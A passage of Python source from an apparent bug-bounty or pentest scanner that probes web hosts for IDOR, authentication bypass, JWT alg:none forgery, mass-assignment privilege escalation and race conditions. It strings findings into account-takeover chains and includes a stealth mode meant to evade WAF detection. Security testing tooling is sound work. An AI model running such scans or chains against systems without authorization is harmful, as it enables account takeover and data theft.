                    "1. Forge JWT with alg:none and admin role claim",
                    f"2. Access session endpoint at {jwt.url}",
                    f"3. Extract sensitive user data from {session.url}",
                    "4. Full account takeover achieved",
                ],
                "impact": "Forged JWT identity combined with session exposure enables complete account takeover.",
            })

    # Chain 3: Mass Assignment → Privilege Escalation
    for mass in mass_list:
        chain_id = secrets.token_hex(6)
        chain_map[mass.id] = chain_id
        chains.append({
            "chain_id": chain_id,
            "type": "mass_assignment_escalation",
            "severity": Severity.CRITICAL.value,
            "finding_ids": [mass.id],
            "steps": [
                f"1. Register/update user at {mass.url} with role=admin field",
                "2. Server assigns admin privilege to attacker-controlled account",
                "3. Use admin account to access all privileged endpoints",
            ],
            "impact": "Mass assignment allows direct privilege escalation to admin without any authentication bypass.",
        })

    return chains, chain_map


# TARGET QUEUE BUILDER
def _build_target_queue(
    probe_result: ProbeResult,
    param_result: ParamScanResult,
    js_result: JSAnalysisResult | None
) -> list[str]:
    """
    Builds deduplicated URL list for scanning.
    Sources: param injectable URLs, JS endpoints, static probes on live hosts.
    """
    candidates: set[str] = set()

    # Source 1: Injectable URLs from param discovery
    for url in param_result.injectable_urls:
        if isinstance(url, str) and (
            _has_idor_pattern(url)
            or any(kw in url.lower() for kw in _ADMIN_KEYWORDS | _AUTH_KEYWORDS)
        ):
            candidates.add(url)

    # Source 2: JS-discovered endpoints — already absolute or relative
    if js_result:
        for host in probe_result.live_hosts:
            base = _host_base_url(host)
            for endpoint in js_result.all_endpoints:
                full = _safe_join(base, endpoint)
                if _has_idor_pattern(full) or any(
                    kw in endpoint.lower() for kw in _ADMIN_KEYWORDS | _AUTH_KEYWORDS
                ):
                    candidates.add(full)

    # Source 3: Static probes on every live host
    for host in probe_result.live_hosts:
        base = _host_base_url(host)
        for path in _STATIC_PROBE_PATHS:
            candidates.add(_safe_join(base, path))

    result = sorted(candidates)
    if len(result) > MAX_TARGET_QUEUE:
        log.warning(f"[Auth] Queue truncated: {len(result)} → {MAX_TARGET_QUEUE}")
    return result[:MAX_TARGET_QUEUE]

# SAVE
def _save_results(result: AuthScanResult) -> Path:
    OUTPUT_PATH.mkdir(parents=True, exist_ok=True)
    safe = _safe_filename(result.target.replace(".", "_"))
    out_file = OUTPUT_PATH / f"{safe}_auth_idor.json"
    with out_file.open("w", encoding="utf-8") as f:
        json.dump(result.to_dict(), f, indent=2)
    log.info(f"[Auth] Results saved → {out_file}")
    return out_file


# ASYNC ORCHESTRATOR
async def _run_scan(
    probe_result: ProbeResult,
    param_result: ParamScanResult,
    js_result: JSAnalysisResult | None,
    timeout: float,
    stealth: bool,
) -> AuthScanResult:
    urls = _build_target_queue(probe_result, param_result, js_result)

    if not urls:
        log.warning(f"[Auth] No testable endpoints for {probe_result.target}")
        return AuthScanResult(target=probe_result.target)

    log.info(f"[Auth] Testing {len(urls)} endpoint(s)")

    sem = asyncio.Semaphore(MAX_CONCURRENT)

    idor_scanner = IDORScanner(probe_result.target, sem, stealth)
    auth_scanner = AuthScanner(probe_result.target, sem, stealth)
    race_scanner = RaceConditionScanner(probe_result.target, stealth)

    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout),
        follow_redirects=True,
        verify=HTTP_VERIFY_SSL,
        limits=httpx.Limits(
            max_connections=MAX_CONCURRENT + 5,
            max_keepalive_connections=10,
        ),
    ) as client:
        idor_findings, auth_findings, race_findings = await asyncio.gather(
            idor_scanner.scan(client, urls),
            auth_scanner.scan(client, urls),
            race_scanner.scan(client, urls),
        )

    all_findings = idor_findings + auth_findings + race_findings
    chains, chain_map = _build_chains(all_findings)
    updated_findings: list[AuthFinding] = []
    for f in all_findings:
        if f.id in chain_map:
            updated_findings.append(
                f.model_copy(update={"chain_id": chain_map[f.id]})
            )
        else:
            updated_findings.append(f)

    return AuthScanResult(
        target=probe_result.target,
        findings=updated_findings,
        tested_endpoints=len(urls),
        chain_opportunities=chains,
    )


# MAIN ENTRY POINT
def scan_broken_auth_idor(
    probe_result: ProbeResult,
    param_result: ParamScanResult,
    js_result: JSAnalysisResult | None = None,
    timeout: float = DEFAULT_TIMEOUT,
    stealth: bool = False,
) -> AuthScanResult:
    """
    Broken Auth + IDOR scanner with automatic attack chain detection.

    Detects:
    - Horizontal IDOR (structural similarity — immune to dynamic content)
    - Vertical IDOR (admin endpoint access without auth)
    - Auth bypass via header injection (all 12 bypass headers, concurrent)
    - JWT alg:none (all endpoints, not just auth-keyword URLs)
    - Session exposure via login→profile chain
    - Mass assignment (role escalation via extra POST fields)
    - Race conditions (concurrent burst on state-mutating endpoints)

    Auto-chains:
    - AuthBypass + IDOR → Privilege Escalation
    - JWT None + Session Exposure → Account Takeover
    - Mass Assignment → Privilege Escalation

    Args:
        probe_result: Live host output (Step 7).
        param_result: Parameter discovery output (Step 13).
        js_result: Optional JS analysis output (Step 12) for endpoint enrichment.
        timeout: Per-request timeout in seconds.
        stealth: Add random delays to avoid WAF detection.
    """
    section(f"Broken Auth + IDOR → {probe_result.target}")

    if not probe_result.live_hosts:
        log.warning("[Auth] No live hosts — skipping")
        return AuthScanResult(target=probe_result.target)
    if timeout <= 0:
        raise ValueError(f"timeout must be positive, got {timeout}")

    result = asyncio.run(
        _run_scan(probe_result, param_result, js_result, timeout, stealth)
    )

    log.info(f"[Auth] Findings:  {result.confirmed_count}")
    log.info(f"[Auth] Critical:  {result.critical_count}")
    log.info(f"[Auth] Chains:    {len(result.chain_opportunities)}")

    if result.findings:
        log.warning("[Auth] ★ FINDINGS:")
        for f in result.findings:
            log.warning(f"  [{f.severity}] [{f.finding_type}] {f.url}")

    _save_results(result)
    return result